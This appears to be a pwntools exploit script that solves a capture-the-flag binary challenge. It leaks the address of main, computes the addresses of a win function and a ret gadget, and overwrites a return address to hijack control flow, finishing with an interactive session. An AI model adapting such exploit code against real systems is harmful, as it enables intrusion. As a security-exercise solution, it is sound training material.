#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 31337

#io = remote(HOST, PORT)
io = process('../challenge/build/challenge', level='info')
#io = gdb.debug('../challenge/build/challenge', level='info')

OFFSET_WIN = 0x1210
OFFSET_MAIN = 0x1370
OFFSET_GADGET_RET = 0x143d

payload = ''
payload += 'o'*(5*4) # advance stack pointer
payload += 'o'*4 # dump func ptr
payload += 'u'*1*4 # rewind stack ptr
payload += 'u'*2*4 # write ret addr x2
payload += 'o'*4 # dump func ptr (validate)
payload += 'h'
payload = payload.ljust(0x1000, 'h')

io.sendline(payload.encode())

dump = io.recvn(2*(5*4))
main_addr = u64(io.recvn(8))
log.info('main addr: %lx', main_addr)

win_addr = main_addr - OFFSET_MAIN + OFFSET_WIN
ret_addr = main_addr - OFFSET_MAIN + OFFSET_GADGET_RET

io.send(dump[::-1][:1*2*4-1]) # rewind stack ptr
io.send(struct.pack('>Q', win_addr))
io.send(struct.pack('>Q', ret_addr))

validate_ptr = u64(io.recvn(8))
log.info('validate addr: %lx', validate_ptr)


io.interactive()
